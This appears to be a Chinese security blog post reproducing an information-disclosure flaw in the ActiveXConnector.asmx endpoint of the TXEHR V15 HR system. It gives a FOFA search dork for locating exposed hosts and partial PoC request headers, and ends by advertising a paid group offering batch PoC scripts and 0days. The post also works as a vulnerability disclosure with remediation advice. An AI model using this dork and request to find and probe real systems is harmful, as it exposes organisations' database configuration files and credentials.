#  「漏洞复现」同享人力资源管理系统-TXEHR V15 ActiveXConnector 信息泄露漏洞   
冷漠安全  冷漠安全   2024-12-04 12:20  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
同享人力资源管理系统（TXEHR V15）是一款专为现代企业设计的人力资源管理软件解决方案，旨在通过先进的信息化手段提升企业人力资源管理的效率与水平。该系统集成了组织人事、考勤管理、薪资核算、招聘配置、培训发展、绩效管理等核心模块，并提供了灵活的配置选项和强大的数据分析能力，以满足不同企业规模和行业特性的需求。  
  
0x03  
  
**漏洞威胁**  
  
同享人力资源管理系统-TXEHR V15 ActiveXConnector.asmx 接口处存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件如数据库配置文件等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="/Assistant/Default.aspx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qzIuiccyt5tsicMlaxap25ExOZHndOoNw4znBIyNPKXzSibSFfic34wamIJWjRXMAfaJ6hvw7PJkiczGA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /Service/ActiveXConnector.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: text/xml;charset=UTF-8
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qzIuiccyt5tsicMlaxap25ExVArHHxibJsuaiaaAtWiaQLroor8IE6vd0u4lHe7wL6mDeYwu5fFVnaUMQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qzIuiccyt5tsicMlaxap25ExoTQXJzhUu8sI9SCnYn1Y1I2zLcXIxuqYhVbeh7N2GLxHFjF1PxlrfQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qzIuiccyt5tsicMlaxap25ExhTQ2LwAo7zYA8Jl2roXlFoDWEFxQyEn41OKd7XL5MYbnDA5pAZVaDQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qzIuiccyt5tsicMlaxap25ExRX76HUUtMNSOejLyBu2ticGQicDIOFVYGZ1MHAwv5NBQRut4lqOCd4ug/640?wx_fmt=gif&from=appmsg "")  
  
  
